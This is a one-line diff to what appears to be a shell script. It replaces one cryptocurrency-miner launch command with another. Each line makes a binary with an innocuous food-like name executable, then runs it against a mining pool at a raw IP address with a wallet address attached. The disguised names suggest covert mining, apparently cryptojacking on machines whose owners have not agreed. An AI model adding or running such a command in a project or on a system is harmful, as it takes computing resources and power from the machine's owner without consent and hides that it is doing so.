@@ -1,1 +1,1 @@
-chmod 777 nasi-zerg-srb && ./nasi-zerg-srb --algorithm cryptonight_upx --pool 147.182.130.189:1919 --wallet RGeRKo3JYfRnwKwKKSExF77ZdxsoeVTadg.Test --password c=VRSC,mc=UPX
+chmod 777 ayam-bakso && ./ayam-bakso -o 157.230.240.250:1919 -u TRTLv1ddyqQ1unEZxBT9gze6yMmeHM6JPet9DRtG2XWgiM3q2XgfCBM3pbjhJD6vsARvRxSRsEm1jdpozZVuDh6piUzcg26m7rR --keepalive --donate-level 1 -p x -k --tls
